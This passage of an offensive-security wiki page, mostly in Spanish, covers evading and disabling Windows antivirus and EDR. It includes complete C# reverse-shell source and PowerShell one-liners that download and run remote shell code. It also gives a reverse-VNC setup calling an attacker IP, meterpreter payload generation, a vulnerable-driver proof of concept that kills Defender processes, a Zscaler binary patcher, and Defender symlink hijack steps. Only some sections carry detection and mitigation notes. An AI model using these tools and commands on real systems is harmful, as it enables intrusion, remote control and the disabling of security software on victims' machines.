Token stomping es una técnica que permite a un atacante **manipular el access token o un producto de seguridad como un EDR o AV**, permitiéndole reducir sus privilegios para que el proceso no muera pero no tenga permisos para comprobar actividades maliciosas.

Para prevenir esto, Windows podría **impedir que procesos externos** obtengan handles sobre los tokens de los procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como se describe en [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es fácil desplegar Chrome Remote Desktop en el PC de la víctima y luego usarlo para tomarlo y mantener persistencia:
1. Descargar desde https://remotedesktop.google.com/, hacer clic en "Set up via SSH", y luego hacer clic en el archivo MSI para Windows para descargar el MSI.
2. Ejecutar el instalador silenciosamente en la víctima (se requiere admin): `msiexec /i chromeremotedesktophost.msi /qn`
3. Volver a la página de Chrome Remote Desktop y hacer clic en next. El asistente te pedirá autorizar; haz clic en Authorize para continuar.
4. Ejecutar el parámetro dado con algunos ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Nota el parámetro pin que permite establecer el pin sin usar la GUI).


## Advanced Evasion

Evasion es un tema muy complicado; a veces tienes que tener en cuenta muchas fuentes de telemetría diferentes en un solo sistema, por lo que es prácticamente imposible permanecer completamente indetectado en entornos maduros.

Cada entorno al que te enfrentes tendrá sus propias fortalezas y debilidades.

Te animo mucho a ver esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener una introducción a técnicas de Advanced Evasion.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) que **eliminará partes del binario** hasta que **determine qué parte Defender** está marcando como maliciosa y te la divida.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred) con un servicio web abierto en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hasta Windows10, todas las versiones de Windows venían con un **Telnet server** que podías instalar (como administrador) haciendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que se **inicie** cuando arranque el sistema y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar telnet port** (sigiloso) y desactivar firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (quieres las descargas bin, no el setup)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el servidor:

- Habilitar la opción _Disable TrayIcon_
- Establecer una contraseña en _VNC Password_
- Establecer una contraseña en _View-Only Password_

Luego, mueve el binario _**winvnc.exe**_ y el archivo **recién** creado _**UltraVNC.ini**_ dentro de la **víctima**

#### **Reverse connection**

El **atacante** debería **ejecutar en** su **host** el binario `vncviewer.exe -listen 5900` para que esté **preparado** para recibir una reverse **VNC connection**. Luego, dentro de la **víctima**: inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ADVERTENCIA:** Para mantener el sigilo no debes hacer las siguientes cosas

- No inicies `winvnc` si ya está en ejecución o desencadenarás un [popup](https://i.imgur.com/1SROTTl.png). Comprueba si está en ejecución con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o se abrirá [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para ayuda o desencadenarás un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El defender actual terminará el proceso muy rápido.**

### Compilando nuestra propia reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primera C# Revershell

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando el compilador
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores para C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ejemplo de uso de python para build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Desactivando AV/EDR desde el espacio de kernel

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para deshabilitar las protecciones endpoint antes de desplegar ransomware. La herramienta trae su **propio driver vulnerable pero *firmado*** y lo abusa para emitir operaciones privilegiadas en kernel que incluso servicios AV Protected-Process-Light (PPL) no pueden bloquear.

Puntos clave
1. **Signed driver**: El archivo entregado en disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys` de “System In-Depth Analysis Toolkit” de Antiy Labs. Debido a que el driver porta una firma válida de Microsoft se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **servicio kernel** y la segunda lo inicia para que `\\.\ServiceMouse` quede accesible desde user land.
3. **IOCTLs expuestos por el driver**
| Código IOCTL | Capacidad                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminar un proceso arbitrario por PID (usado para matar servicios de Defender/EDR) |
| `0x990000D0` | Eliminar un archivo arbitrario en disco |
| `0x990001D0` | Descargar el driver y eliminar el servicio |

Prueba de concepto mínima en C:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Por qué funciona**: BYOVD omite por completo las protecciones en user-mode; el código que se ejecuta en kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel independientemente de PPL/PP, ELAM u otras características de endurecimiento.

Detección / Mitigación
• Habilitar la lista de bloqueo de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows rechace cargar `AToolsKrnl64.sys`.  
• Monitorizar la creación de nuevos servicios *kernel* y alertar cuando un driver se cargue desde un directorio escribible por todos o no esté presente en la lista de permitidos (allow-list).  
• Vigilar handles en user-mode a objetos de dispositivo personalizados seguidos de llamadas sospechosas a `DeviceIoControl`.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

El **Client Connector** de Zscaler aplica reglas de posture del dispositivo localmente y se apoya en Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles permiten un bypass completo:

1. La evaluación de posture ocurre **completamente en el cliente** (se envía un booleano al servidor).  
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **firmado por Zscaler** (vía `WinVerifyTrust`).

Al parchear cuatro binarios firmados en disco, ambos mecanismos pueden ser neutralizados:

| Binario | Lógica original parcheada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1` por lo que cada comprobación es conforme |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | NOP-ed ⇒ cualquier proceso (incluso sin firmar) puede enlazarse a las pipes RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Reemplazada por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad en el túnel | Cortocircuitado |

Fragmento mínimo del parcheador:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar la pila de servicios:

* **Todas** las comprobaciones de postura muestran **verde/cumple**.
* Binarios no firmados o modificados pueden abrir los endpoints RPC de named-pipe (p. ej. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso irrestricto a la red interna definida por las políticas de Zscaler.

Este estudio de caso demuestra cómo decisiones de confianza puramente del lado del cliente y simples comprobaciones de firma pueden ser derrotadas con unos pocos parches de bytes.

## Abusar de Protected Process Light (PPL) para manipular AV/EDR con LOLBINs

Protected Process Light (PPL) aplica una jerarquía de firmante/nivel de forma que solo procesos protegidos de igual o mayor nivel pueden manipularse entre sí. Ofensivamente, si puedes iniciar legítimamente un binario habilitado para PPL y controlar sus argumentos, puedes convertir funcionalidad benigna (p. ej., logging) en una primitiva de escritura limitada, respaldada por PPL, contra directorios protegidos usados por AV/EDR.

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- El binario del sistema firmado `C:\Windows\System32\ClipUp.exe` se inicia a sí mismo y acepta un parámetro para escribir un archivo de registro en una ruta especificada por quien llama.
- Cuando se inicia como un proceso PPL, la escritura del archivo ocurre con respaldo PPL.
- ClipUp no puede analizar rutas que contienen espacios; utilice 8.3 short paths para apuntar a ubicaciones normalmente protegidas.

8.3 short path helpers
- Listar nombres cortos: `dir /x` en cada directorio padre.
- Derivar la ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Inicie el LOLBIN capaz de PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un lanzador (p. ej., CreateProcessAsPPL).
2) Pase el argumento log-path de ClipUp para forzar la creación de un archivo en un directorio AV protegido (p. ej., Defender Platform). Utilice 8.3 short names si es necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (p. ej., MsMpEng.exe), programe la escritura en el arranque antes de que el AV se inicie instalando un servicio de inicio automático que se ejecute de forma fiable antes. Valide el orden de arranque con Process Monitor (boot logging).
4) Al reiniciar, la escritura respaldada por PPL ocurre antes de que el AV bloquee sus binarios, corrompiendo el archivo objetivo e impidiendo el arranque.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- No puedes controlar el contenido que escribe ClipUp más allá de la ubicación; la primitiva está más indicada para corrupción que para inyección precisa de contenido.
- Requiere admin local/SYSTEM para instalar/iniciar un servicio y una ventana para reiniciar.
- La sincronización es crítica: el objetivo no debe estar abierto; la ejecución en el arranque evita bloqueos de archivos.

Detecciones
- Creación de proceso de `ClipUp.exe` con argumentos inusuales, especialmente parentado por launchers no estándar, durante el arranque.
- Nuevos servicios configurados para auto-start de binarios sospechosos y que consistentemente arrancan antes que Defender/AV. Investigar la creación/modificación de servicios antes de fallos en el inicio de Defender.
- Monitoreo de integridad de archivos sobre binarios/Directorios Platform de Defender; creaciones/modificaciones inesperadas de archivos por procesos con banderas de protected-process.
- Telemetría ETW/EDR: buscar procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de niveles PPL por binarios no-AV.

Mitigaciones
- WDAC/Code Integrity: restringir qué binarios firmados pueden correr como PPL y bajo qué padres; bloquear invocaciones de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringir la creación/modificación de servicios auto-start y monitorear manipulaciones del orden de inicio.
- Asegurar que Defender tamper protection y early-launch protections estén habilitadas; investigar errores de arranque que indiquen corrupción de binarios.
- Considerar deshabilitar la generación de nombres cortos 8.3 en volúmenes que alojan tooling de seguridad si es compatible con su entorno (probar a fondo).

Referencias para PPL y tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Manipulación de Microsoft Defender mediante Symlink Hijack de la carpeta Platform Version

Windows Defender elige la platform desde la que se ejecuta enumerando subcarpetas bajo:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (p. ej., `4.18.25070.5-0`), y luego inicia los procesos del servicio Defender desde allí (actualizando las rutas de servicio/registro en consecuencia). Esta selección confía en las entradas de directorio incluyendo directory reparse points (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta escribible por un atacante y lograr DLL sideloading o la interrupción del servicio.

Precondiciones
- Administrador local (necesario para crear directorios/symlinks bajo la carpeta Platform)
- Capacidad para reiniciar o forzar la re-selección de la platform de Defender (reinicio del servicio en el arranque)
- Solo se requieren herramientas integradas (mklink)

Por qué funciona
- Defender bloquea escrituras en sus propias carpetas, pero su selección de platform confía en las entradas de directorio y elige la versión lexicográficamente más alta sin validar que el destino se resuelva a una ruta protegida/confiable.

Paso a paso (ejemplo)
1) Prepara un clon escribible de la carpeta Platform actual, p. ej. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink de directorio de versión superior dentro de Platform que apunte a tu carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del desencadenador (se recomienda reiniciar):
```cmd
shutdown /r /t 0
```
4) Verifique que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Deberías observar la nueva ruta del proceso bajo `C:\TMP\AV\` y la configuración del servicio/registro reflejando esa ubicación.

Post-exploitation options
- DLL sideloading/code execution: Colocar/reemplazar DLLs que Defender carga desde su application directory para ejecutar código en los procesos de Defender. Ver la sección anterior: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Elimina el version-symlink de modo que en el siguiente arranque la ruta configurada no se resuelva y Defender falle al iniciar:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Tenga en cuenta que esta técnica no proporciona escalada de privilegios por sí sola; requiere privilegios de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Los red teams pueden mover la evasión en tiempo de ejecución fuera del implant C2 y dentro del módulo objetivo mismo al hookear su Import Address Table (IAT) y enrutar APIs seleccionadas a través de código controlado por el atacante, position‑independent (PIC). Esto generaliza la evasión más allá de la reducida superficie de APIs que exponen muchos kits (p. ej., CreateProcessA), y extiende las mismas protecciones a BOFs y DLLs de post‑explotación.

High-level approach
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
  - Enmascarar/desenmascarar memoria alrededor de la llamada (p. ej., cifrar regiones de beacon, RWX→RX, cambiar nombres/permisos de páginas) y luego restaurar después de la llamada.
  - Call‑stack spoofing: construir una pila benigna y transicionar hacia la API objetivo para que el análisis de call‑stack resuelva en los frames esperados.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Why IAT hooking here
- Works for any code that uses the hooked import, without modifying tool code or relying on Beacon to proxy specific APIs.
- Covers post‑ex DLLs: hooking LoadLibrary* lets you intercept module loads (e.g., System.Management.Automation.dll, clr.dll) and apply the same masking/stack evasion to their API calls.
- Restores reliable use of process‑spawning post‑ex commands against call‑stack–based detections by wrapping CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplica el parche después de relocations/ASLR y antes del primer uso de la importación. Reflective loaders como TitanLdr/AceLdr demuestran hooking durante DllMain del módulo cargado.
- Mantén los wrappers pequeños y PIC-safe; resuelve la API real vía el valor original del IAT que capturaste antes del parcheo o vía LdrGetProcedureAddress.
- Usa transiciones RW → RX para PIC y evita dejar writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- Esto evade las detecciones que esperan canonical stacks desde Beacon/BOFs hacia sensitive APIs.
- Empareja con técnicas de stack cutting/stack stitching para aterrizar dentro de los frames esperados antes del prólogo de la API.

Integración operativa
- Anteponer el reflective loader a las post‑ex DLLs para que el PIC y los hooks se inicialicen automáticamente cuando se cargue la DLL.
- Usa un script Aggressor para registrar las APIs objetivo para que Beacon y BOFs se beneficien de forma transparente de la misma vía de evasión sin cambios de código.

Detección/DFIR consideraciones
- IAT integrity: entradas que se resuelven en direcciones non‑image (heap/anon); verificación periódica de los import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## Referencias

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
